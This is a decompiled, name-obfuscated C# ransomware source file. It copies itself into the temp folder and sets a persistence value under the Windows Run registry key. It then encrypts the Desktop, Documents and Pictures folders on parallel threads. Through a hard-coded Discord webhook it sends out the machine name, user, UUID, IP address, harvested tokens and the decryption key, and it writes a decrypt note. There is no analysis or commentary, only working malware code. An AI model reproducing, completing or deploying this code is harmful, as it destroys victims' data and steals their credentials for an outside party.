using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal class Set_ColumnReader
{
	private static string RslvDynamicScopeFieldInfo = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private static string Set_IsClass = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static string GUID = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	public static string S_allSystemTimeZonesRead = "https://canary.discord.com/api/webhooks/857407146350346250/rbMrQufkErFs0X4UXTk_GItYhUXy1JM8pSMNFESz-OQ0qBFTSTDtKR_-ze3Lja8lE3R8";

	public static string Getmark = "ZGVmYXVsdHBhc3N3b3Jk";

	private static CancelAsync StringHeap = new CancelAsync("DEBUG", 0);

	private static ImageStreamCreator Single = new ImageStreamCreator(S_allSystemTimeZonesRead);

	private static void M_decryptindex(string[] args)
	{
		if (GetMaxGeneration())
		{
			Application.Run((Form)(object)new MarkFaultAddr());
			return;
		}
		GetNamespaces();
		SetPublicKey();
		GetDayOfWeek();
		GetMethodVersion();
		ImplMap();
		Thread.Sleep(6000);
		Application.Run((Form)(object)new MarkFaultAddr());
	}

	private static void GetDayOfWeek()
	{
		StringHeap.Cancel("Setup start");
		List<string> list = CFRelease.TargetsAtLeast_Silverlight_V4();
		string text = "";
		foreach (string item in list)
		{
			text = text + item + "\n";
		}
		Console.WriteLine(text);
		List<string> list2 = Set_AssemblyResolver.TryCode();
		string text2 = Set_AssemblyResolver.FindMethodHandle();
		string text3 = Set_AssemblyResolver.CodePageUTF8();
		ImageStreamCreator imageStreamCreator = new ImageStreamCreator(S_allSystemTimeZonesRead);
		imageStreamCreator.Set_Extra("**Program executed** ```Status: Active \nPC Name: " + list2[0] + "\nUser:" + list2[1] + "\nUUID: " + text2 + "\nIP Address: " + text3 + "```");
		imageStreamCreator.Set_Extra("```Decryption Key: " + Getmark + "```");
		imageStreamCreator.Set_Extra("```Tokens:\n" + text + "```");
	}

	public static void GetMethodVersion()
	{
		Single.Set_Extra("```Starting file encryption..```");
		Thread thread = new Thread((ThreadStart)delegate
		{
			StartInternal.LocalSiteString(Set_IsClass);
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			StartInternal.LocalSiteString(GUID);
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			StartInternal.LocalSiteString(RslvDynamicScopeFieldInfo);
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread.Join();
		thread2.Join();
		thread3.Join();
		Single.Set_Extra($"```Finished encrypting victim's files. Total number of files encrypted: {StartInternal.Get_IsValueCreated.Count}```");
		MatchIndex.Get_IsAbsoluteUri();
	}

	public static void Anonymous()
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			StartInternal.IllogicalCallContext = Set_IsClass;
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			StartInternal.IllogicalCallContext = GUID;
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			StartInternal.IllogicalCallContext = RslvDynamicScopeFieldInfo;
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread.Join();
		thread2.Join();
		thread3.Join();
	}

	private static void SetPublicKey()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + ".exe";
			string text2 = Path.GetTempPath() + text;
			Console.WriteLine(text2);
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("NR", "\"" + text2 + "\"");
		}
		catch (Exception ex)
		{
			StringHeap.Conv_Ovf_I_Un(ex.Message);
		}
	}

	public static void Get_CustomAttributeTypeTag()
	{
		if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "NR", true) != null)
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true))
			{
				registryKey.DeleteValue("NR", throwOnMissingValue: false);
			}
		}
	}

	private static void GetNamespaces()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + ".exe";
			string sourceFileName = Path.Combine(Environment.CurrentDirectory, text);
			File.Copy(sourceFileName, Path.GetTempPath() + text);
			Console.WriteLine(Path.GetTempPath());
		}
		catch (Exception ex)
		{
			StringHeap.Cancel(ex.Message);
		}
	}

	private static bool GetMaxGeneration()
	{
		if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "NR", null) != null)
		{
			return true;
		}
		return false;
	}

	private static void ImplMap()
	{
		string text = Path.GetTempPath() + "NR_decrypt.txt";
		Console.WriteLine(text);
		using StreamWriter streamWriter = new StreamWriter(text);
		streamWriter.WriteLine(Getmark);
	}
}
